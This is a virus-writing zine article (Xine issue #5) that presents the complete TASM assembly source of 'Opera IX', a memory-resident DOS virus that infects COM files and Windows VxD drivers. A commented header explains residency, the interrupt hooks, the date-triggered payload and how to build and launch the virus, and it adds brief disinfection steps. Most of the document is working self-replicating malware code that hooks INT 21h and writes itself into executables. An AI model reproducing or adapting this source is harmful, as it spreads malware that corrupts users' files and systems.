   ;
   ;
   ;                                              ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;                                              ³ Xine - issue #5 - Phile 210 ³
   ;                                              ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;
   ;
   ;
   ;
   ; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ; ³ DOS16/VxD.Opera IX ³
   ; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ;   This virus is a simple COM (including ENUNS) and VxD infector. I wrote it
   ; to demonstrate VxD real-mode infection and then added COM support to make it
   ; more effective.
   ;
   ; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ; ³ 1. Virus analysis ³
   ; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;   When the virus receives execution control, it makes its residency check,
   ; goes resident (if necessary) using a generic way and activates the payload
   ; if the current date matches the one of the payload. Then, it hooks interrupt
   ; vectors, reloads the original code and transfers execution to it.
   ;
   ; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ; ³ 1.1. Residency ³
   ; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;   To go resident, the virus finds a suitable MCB/UMB, shrinks it to create a
   ; new one and copies the virus code to the allocated space.
   ;
   ; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ; ³ 1.2. Interrupt hooks ³
   ; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;   The INT 21h hook, handles the infection of COM and VxD files, whereas the
   ; INT 2Fh hook, handles the residency check and rehooks INT 21h.
   ;
   ; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ; ³ 1.3. Payload ³
   ; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;   The virus decrypts and displays the following string:
   ;
   ; "Opera IX, Horned Beast/VADER"
   ;
   ; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ; ³ 1.4.1. File map: COM ³
   ; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;     Before infection           After infection
   ; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ; ³                      ³   ³      Virus code      ³
   ; ³       COM data       ³   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
   ; ³                      ³   ³                      ³
   ; ³                      ³   ³                      ³
   ; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
   ;                            ³       COM data       ³
   ;                            ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
   ;                            ³      ENUNS data      ³
   ;                            ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ; ³ 1.4.2. File map: VxD ³
   ; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;     Before infection           After infection
   ; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ; ³                      ³   ³                      ³
   ; ³       VxD data       ³   ³       VxD data       ³
   ; ³                      ³   ³                      ³
   ; ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
   ; ³ Real-mode init proc  ³   ³      Virus code      ³
   ; ³                      ³   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
   ; ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
   ; ³       VxD data       ³   ³       VxD data       ³
   ; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
   ;                            ³ Real-mode init proc  ³
   ;                            ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
   ;                            ³      ENUNS data      ³
   ;                            ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ; ³ 2. Assembling and compiling ³
   ; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ; Compile it to a COM file, using:
   ; tasm opera9 /ml /m5
   ; tlink opera9 /t
   ;
   ; ÚÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ; ³ 3. Loading ³
   ; ÀÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;   Execute the virus loader. The virus will then stay resident and infect any
   ; accessed files.
   ;
   ; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ; ³ 4. Disinfection ³
   ; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;   Decrypt and copy Virus_Size bytes at position EOF-(Virus_Size+ENUNS_Size)
   ; to the start of file (COM files) or to the start of the real-mode init proc
   ; (VxD files), fixing the appropriate "OH_size" and "LE_eip" fields (if neces-
   ; sary). Then, reduce the file size by (Virus_Size+ENUNS_Size) bytes.

   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´ Start of file: OPERA9.ASM ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                   .Model  Tiny
                   .Code
                   .386

                   include DOS.INC
                   include MZ.INC
                   include LE.INC

                   .Radix  16d
                   org     (size PSP)

   Virus_Size      =       Real_Mode_End-Real_Mode_Start
   Virus_Resident_Size =   Resident_End-Real_Mode_Start
   Virus_Resident_PSize =  (Virus_Resident_Size+15d)/16d
   ENUNS_Size      =       Save_i24-ENUNS_Mark
   Virus_Sign      =       'HB' ;"Horned Beast"
   Payload_Date    =       719 ;Payload activation date
   Min_Size        =       Virus_Size+100
   Max_Size        =       -Min_Size

   Real_Mode_Start:
                   push    cs
                   push    (size PSP)
   Return_IP       =       $-2
                   pusha
                   mov     bp,size PSP
   Start_IP        =       $-2
                   mov     ax,-1
                   mov     bx,Virus_Sign
                   int     2fh ;Residency check
                   inc     ax
                   jz      Not_Resident
                   push    bx ;Virus CS
                   push    Reload_File-Real_Mode_Start
                   retf
   Not_Resident:
                   push    ds
                   mov     ah,52
                   int     21 ;Get list of lists
                   xor     cx,cx
                   mov     ax,1600
                   int     2fh ;Windows enhanced mode installation check
                   test    al,7fh
                   jnz     Use_MCBs ;Windows running
                   lds     si,dword ptr es:[bx+12] ;Pointer to disk buffer info record
                   mov     dx,word ptr ds:[si+1fh] ;Segment of first UMB (or -1)
                   cmp     dx,-1
                   je      Use_MCBs
                   call    Allocate_Block
                   or      di,di
                   jnz     Allocation_Done
   Use_MCBs:
                   inc     cx
                   mov     dx,word ptr es:[bx-2] ;Segment of first MCB
                   call    Allocate_Block
   Allocation_Done:
                   pop     ds
                   mov     es,dx
                   mov     si,bp
                   xor     di,di
                   cld
                   mov     cx,(Virus_Size+1)/2
                   rep     movsw ;Copy virus code
                   push    es
                   push    Mem_Return-Real_Mode_Start
                   mov     ah,4
                   int     1ah ;Get real-time clock date
                   jc      No_Payload
                   cmp     dx,Payload_Date
                   jne     No_Payload
                   lea     si,[bp+Virus_Name-Real_Mode_Start]
                   ;Display virus name
   Display_Next_Char:
                   lodsb
                   xor     al,66
                   int     29 ;Fast console output
                   cmp     al,0 ;Last char
                   jne     Display_Next_Char
   No_Payload:
                   retf

                   .Radix  10d
   Virus_Name      db      41,22,3,20,7,70,47,62,74,70,46,9,20,8,3,2,70,36,3,7
                   db      21,18,73,48,39,34,35,52,102
   ;Encrypted "Opera IX, Horned Beast/VADER",0
                   .Radix  16d

   Mem_Return:
                   call    Hook_i21_Vector
                   mov     di,2fh*4
                   mov     ax,Handler_i2f-Real_Mode_Start
                   mov     si,Save_i2f-Real_Mode_Start
                   call    Hook_Vector
   Reload_File:
                   mov     si,ds
                   or      bp,bp
                   jnz     Reload_COM
                   call    Read_File
                   jmp     Reload_Done
   Reload_COM:
                   push    ds
                   mov     ds,word ptr ds:[PSP_Environment]
                   xor     bx,bx
   Seek_Name:
                   inc     bx
                   cmp     word ptr ds:[bx],1
                   jne     Seek_Name
                   lea     dx,[bx+2]
                   mov     ax,3d00h
                   call    Simulate_i21 ;Open current file (read mode)
                   call    Read_File
                   mov     ah,3eh
                   call    Simulate_i21 ;Close current file
                   pop     ds
   Reload_Done:
                   popa
                   push    ds
                   pop     es
                   retf

   ;Interrupt vector handlers
   Handler_i21:
                   pushf
                   cmp     ax,3303
                   jne     Check_Exec
                   cmp     bx,Virus_Sign
                   jne     Old_i21
                   ;Indicate that Handler_i21 is working
                   xor     ax,ax
                   popf
                   iret

   Check_Open:
                   cmp     ah,3dh
                   je      Infect_File
                   cmp     ah,56
                   je      Infect_File
                   cmp     ah,43
                   je      Verify_AL
   Old_i21:
                   popf
                   db      0eah ;Jmp XXXX:XXXX
   Save_i21        dd      0

   Check_Exec:
                   cmp     ah,4bh
                   jne     Check_Open
   Verify_AL:
                   cmp     al,1
                   ja      Old_i21
   Infect_File:
                   pushad
                   mov     bx,dx
                   mov     si,Buffer-Real_Mode_Start
                   ;Canonicalize filename
   Next_Char:
                   mov     al,byte ptr ds:[bx]
                   cmp     al,'a'
                   jb      Skip_Char
                   cmp     al,'z'
                   ja      Skip_Char
                   sub     al,'a'-'A'
   Skip_Char:
                   mov     byte ptr cs:[si],al
                   inc     bx
                   inc     si
                   cmp     al,0
                   jne     Next_Char
                   mov     eax,dword ptr cs:[si-4] ;File extension
                   cmp     eax,'MOC'
                   je      Infect_COM
                   cmp     eax,'DXV'
                   jne     Pop_Exit
                   xor     ax,ax
                   jmp     Infect_Multi
   Infect_COM:
                   mov     ax,size PSP
                   mov     word ptr cs:[Return_IP-Real_Mode_Start],ax
   Infect_Multi:
                   mov     word ptr cs:[Start_IP-Real_Mode_Start],ax
                   mov     ax,4300
                   call    Simulate_i21 ;Get file attributes
                   jc      Pop_Exit
                   push    cx dx ds
                   mov     di,24*4
                   mov     ax,Handler_i24-Real_Mode_Start
                   mov     si,Save_i24-Real_Mode_Start
                   call    Hook_Vector
                   test    cl,not (mask FA_unused+mask FA_archive)
                   jz      Open_File
                   mov     ax,4301
                   xor     cx,cx ;No attributes
                   call    Simulate_i21 ;Set file attributes
                   jc      Restore_Attrib
   Open_File:
                   mov     ax,3d02h
                   call    Simulate_i21 ;Open the file (read/write mode)
                   jc      Restore_Attrib
                   xchg    bx,ax
                   mov     ax,5700
                   call    Simulate_i21 ;Get file's date and time
                   mov     ax,cx
                   and     al,mask FT_seconds2
                   cmp     al,mask FT_seconds2
                   je      Close_Restore_Attrib
                   push    cx dx cs
                   pop     ds
                   cmp     byte ptr ds:[Start_IP-Real_Mode_Start+1],(size PSP) shr 8
                   jne     Read_Driver
                   call    Seek_End
                   or      dx,dx
                   jnz     Restore_Date
                   cmp     ax,Min_Size
                   jb      Restore_Date
                   cmp     ax,Max_Size
                   ja      Restore_Date
                   dec     ax
                   dec     ax
                   xchg    dx,ax
                   call    Seek_CX_DX
                   mov     cx,2
                   mov     dx,ENUNS_Magic-Real_Mode_Start
                   call    Simulate_Read
                   add     word ptr ds:[ENUNS_Magic-Real_Mode_Start],Virus_Size+ENUNS_Size
                   xor     ax,ax
                   cwd
                   jmp     Finish_Infection
   Read_Driver:
                   mov     cx,IMAGE_SIZEOF_DOS_HEADER
                   call    Simulate_Read_CX ;Read MZ header
                   ;Check for a valid VxD
                   mov     si,dx ;DX=(Buffer-Real_Mode_Start)
                   cmp     word ptr ds:[si.MZ_magic],IMAGE_DOS_SIGNATURE
                   jne     Restore_Date
                   cmp     word ptr ds:[si.MZ_lfarlc],IMAGE_SIZEOF_DOS_HEADER
                   jb      Restore_Date
                   mov     ebp,dword ptr ds:[si.MZ_lfanew]
                   mov     edi,ebp
                   call    Seek_EBP
                   mov     cx,IMAGE_SIZEOF_VXD_HEADER
                   call    Simulate_Read_CX ;Read LE header
                   cmp     dword ptr ds:[si.LE_magic],(IMAGE_VXD_LEWO shl 24d)\
                   +(IMAGE_VXD_LEBO shl 16d)+IMAGE_VXD_SIGNATURE
                   jne     Restore_Date
                   cmp     word ptr ds:[si.LE_os],IMAGE_VXD_OS_DEV386
                   jne     Restore_Date
                   cmp     word ptr ds:[si.LE_cpu],IMAGE_VXD_CPU_386
                   jb      Restore_Date
                   cmp     word ptr ds:[si.LE_cpu],IMAGE_VXD_CPU_586
                   ja      Restore_Date
                   add     ebp,dword ptr ds:[si.LE_objtab]
                   call    Seek_EBP
                   ;Find real-mode object
   Go_Next_Object:
                   mov     cx,IMAGE_SIZEOF_OBJECT_HEADER
                   lea     dx,[si+IMAGE_SIZEOF_VXD_HEADER]
                   call    Simulate_Read ;Read one object table entry
                   cmp     word ptr ds:[si+IMAGE_SIZEOF_VXD_HEADER\
                   .OH_flags],IMAGE_OBJ_READ+IMAGE_OBJ_EXEC+IMAGE_OBJ_ALIAS16
                   je      Found_Real_Mode
                   movzx   ecx,cx
                   add     ebp,ecx
                   dec     dword ptr ds:[si.LE_objcnt]
                   jnz     Go_Next_Object
                   jmp     Restore_Date
   Found_Real_Mode:
                   mov     cx,Virus_Size
                   mov     ax,word ptr ds:[si+IMAGE_SIZEOF_VXD_HEADER.OH_mapsize]
                   mul     word ptr ds:[si.LE_pagesize]
                   or      dx,dx
                   jnz     Size_OK
                   cmp     ax,cx
                   jb      Restore_Date
   Size_OK:
                   cmp     word ptr ds:[si+IMAGE_SIZEOF_VXD_HEADER.OH_size],cx
                   jae     No_Size_Patch
                   dec     dword ptr ds:[si.LE_objcnt]
                   jz      Restore_Date ;Don't patch size if last object
                   mov     word ptr ds:[si+IMAGE_SIZEOF_VXD_HEADER.OH_size],cx
                   call    Seek_EBP
                   lea     dx,[si+IMAGE_SIZEOF_VXD_HEADER.OH_size]
                   call    Simulate_Write_DX ;Patch real-mode object size
   No_Size_Patch:
                   mov     ecx,dword ptr ds:[si.LE_startobj]
                   jecxz   No_EIP_Patch
                   xor     cx,cx
                   xchg    cx,word ptr ds:[si.LE_eip]
                   jcxz    No_EIP_Patch
                   push    cx
                   lea     ebp,[edi.LE_eip]
                   call    Seek_EBP
                   lea     dx,[si.LE_eip]
                   call    Simulate_Write_DX ;Patch original real-mode init proc IP
                   pop     cx
   No_EIP_Patch:
                   mov     word ptr ds:[Return_IP-Real_Mode_Start],cx
                   mov     ax,word ptr ds:[si+IMAGE_SIZEOF_VXD_HEADER.OH_pagemap]
                   dec     ax
                   mul     word ptr ds:[si.LE_pagesize]
                   add     ax,word ptr ds:[si.LE_datapage]
                   adc     dx,word ptr ds:[si.LE_datapage+2]
   Finish_Infection:
                   xchg    dx,ax
                   xchg    cx,ax
                   push    cx dx
                   call    Seek_CX_DX
                   mov     cx,Virus_Size
                   call    Simulate_Read_CX ;Read original code
                   push    cx dx
                   call    Seek_End
                   pop     dx cx
                   call    Crypt_Code ;Encrypt original code
                   call    Simulate_Write ;Write original code
                   mov     cx,ENUNS_Size
                   mov     dx,ENUNS_Mark-Real_Mode_Start
                   call    Simulate_Write ;Write ENUNS data
                   pop     dx cx
                   call    Seek_CX_DX
                   mov     cx,Virus_Size
                   xor     dx,dx
                   call    Simulate_Write ;Write virus code
   Restore_Date:
                   pop     dx cx
                   or      cl,mask FT_seconds2
                   mov     ax,5701
                   call    Simulate_i21 ;Set file's date and time
   Close_Restore_Attrib:
                   mov     ah,3eh
                   call    Simulate_i21 ;Close the file
   Restore_Attrib:
                   lds     dx,dword ptr cs:[Save_i24-Real_Mode_Start]
                   mov     ax,2524
                   call    Simulate_i21 ;Set interrupt vector
                   pop     ds dx cx
                   test    cl,not (mask FA_unused+mask FA_archive)
                   jz      Pop_Exit
                   mov     ax,4301
                   call    Simulate_i21 ;Set file attributes
   Pop_Exit:
                   popad
                   jmp     Old_i21

   Handler_i2f:
                   pushf
                   cmp     ax,-1
                   jne     Check_Qualify
                   cmp     bx,Virus_Sign
                   jne     Old_i2f
                   inc     ax
                   mov     bx,cs
                   popf
                   iret

   Check_Qualify:
                   cmp     ax,1123 ;Qualify remote filename
                   jne     Old_i2f
                   pusha
                   mov     ax,3303
                   mov     bx,Virus_Sign
                   int     21 ;Test the int 21h hook
                   or      ax,ax
                   jz      Return_i2f ;Hook is working
                   call    Hook_i21_Vector
   Return_i2f:
                   popa
   Old_i2f:
                   popf
                   db      0eah ;Jmp XXXX:XXXX
   Save_i2f        dd      0

   ;Error handler
   Handler_i24:
                   mov     al,3
                   iret

   ;Routines

   Simulate_Read_CX:
                   mov     dx,Buffer-Real_Mode_Start
   Simulate_Read:
                   mov     ah,3fh
                   jmp     Simulate_i21

   Simulate_Write_DX:
                   mov     cx,2
   Simulate_Write:
                   mov     ah,40
                   jmp     Simulate_i21

   Seek_EBP:
                   mov     ecx,ebp
                   mov     dx,cx
                   shr     ecx,16d
   Seek_CX_DX:
                   mov     al,0
                   jmp     Simulate_Seek
   Seek_End:
                   mov     al,2
   Seek_AL:
                   xor     cx,cx
                   xor     dx,dx
   Simulate_Seek:
                   mov     ah,42

   ;Simulate an int 21h
   Simulate_i21:
                   pushf
                   call    dword ptr cs:[Save_i21-Real_Mode_Start]
                   retn

   ;Read the last accessed file at position EOF-(Virus_Size+ENUNS_Size) to the
   ;address at SI:BP, until position EOF-ENUNS_Size and decrypt the code
   ;Save and restore the file pointer
   Read_File:
                   push    ds es
                   mov     ah,34
                   call    Simulate_i21 ;Get address of "InDOS flag"
                   mov     bx,word ptr es:[bx+28ch-1] ;File handle
                   mov     al,1
                   call    Seek_AL
                   push    ax dx
                   call    Seek_End
                   xchg    dx,ax
                   xchg    cx,ax
                   sub     dx,Virus_Size+ENUNS_Size
                   sbb     cx,ax
                   call    Seek_CX_DX
                   mov     cx,Virus_Size
                   mov     dx,bp
                   mov     ds,si
                   call    Simulate_Read ;Read the code
                   call    Crypt_Code ;Decrypt the code
                   pop     cx dx
                   call    Seek_CX_DX
                   pop     es ds
                   retn

   Hook_i21_Vector:
                   mov     di,21*4
                   mov     ax,Handler_i21-Real_Mode_Start
                   mov     si,Save_i21-Real_Mode_Start

   ;Hook interrupt at 0:DI to CS:AX and save the original at CS:SI
   Hook_Vector:
                   push    ds 0
                   pop     ds
                   xchg    ax,word ptr ds:[di]
                   mov     word ptr cs:[si],ax
                   mov     ax,cs
                   xchg    ax,word ptr ds:[di+2]
                   mov     word ptr cs:[si+2],ax
                   pop     ds
                   retn

   ;Encrypt/decrypt CX bytes at DS:DX
   Crypt_Code:
                   pusha
                   mov     bx,dx
   Crypt_Loop:
                   xor     byte ptr ds:[bx],cl
                   inc     bx
                   loop    Crypt_Loop
                   popa
                   retn

   ;Allocate a MCB/UMB for the virus
   ;þ On entry:
   ;  CX=0: Shrink first usable block
   ;  CX<>0: Shrink last block
   ;  DX=Segment of first block in chain
   ;þ On exit:
   ;  DI=0: No block allocated
   ;    DX=DS=Segment of last block
   ;    SI=Virus_Resident_PSize+((size MCB) shr 4)
   ;  DI=(size MCB): Block allocated
   ;    AX=0
   ;    DX=Pointer to new segment
   ;    SI=8
   ;    DS=Segment of previous block
   Allocate_Block:
                   push    es
                   mov     si,Virus_Resident_PSize+((size MCB) shr 4)
                   ;(size MCB) shifted right by "log2 16"
                   xor     di,di
   Check_Next_Block:
                   mov     ds,dx
                   or      cx,cx
                   jnz     Check_Last_Block
                   cmp     word ptr ds:[di.MCB_ProcessID],di
                   jne     Check_Last_Block ;Block is not free
                   cmp     word ptr ds:[di.MCB_BlockSize],si
                   jae     Found_Good_Block
   Check_Last_Block:
                   cmp     byte ptr ds:[di.MCB_BlockType],LAST_MCB
                   je      Found_Last_Block
                   stc
                   adc     dx,word ptr ds:[di.MCB_BlockSize] ;Point to next block
                   jmp     Check_Next_Block
   Found_Last_Block:
                   jcxz    Fail_Allocation
   Found_Good_Block:
                   sub     word ptr ds:[di.MCB_BlockSize],si
                   inc     dx ;Same as: add dx,(size MCB) shr 4
                   cmp     word ptr ds:[di.MCB_ProcessID],dx
                   jne     No_PSP_Fix
                   sub     word ptr ds:[di+(size MCB).PSP_TopOfMem],si
   No_PSP_Fix:
                   add     dx,word ptr ds:[di.MCB_BlockSize] ;Point to new space
                   mov     es,dx
                   mov     al,CHAINED_MCB
                   xchg    al,byte ptr ds:[di.MCB_BlockType]
                   cld
                   ;Build new block
                   stosb
                   mov     ax,8
                   stosw ;Set owner as DOS
                   xchg    si,ax
                   dec     ax ;Same as: sub ax,(size MCB) shr 4
                   stosw ;Set the new size
                   add     di,3 ;Skip unused data
                   mov     ax,'CS' ;"System Code", for UMBs
                   stosw
                   xor     ax,ax
                   stosw
                   stosw
                   stosw
                   inc     dx
   Fail_Allocation:
                   pop     es
                   retn

   ;ENUNS data
   ENUNS_Mark      db      "ENUNS"

   Real_Mode_End:

   ENUNS_Magic     dw      0
   Save_i24        dd      0
   Buffer          db      (Real_Mode_End-Real_Mode_Start) dup (0)

   Resident_End:

                   .Radix  10d
   Host            db      65,184,62,211
   ;Encrypted:
   ;mov ah,4ch
   ;int 21
                   .Radix  16d

   Padding         db      ((Real_Mode_End-Real_Mode_Start)\
                   +(Save_i24-ENUNS_Mark)-($-Host)) dup (0)

                   end     Real_Mode_Start
   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´ End of file: OPERA9.ASM ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
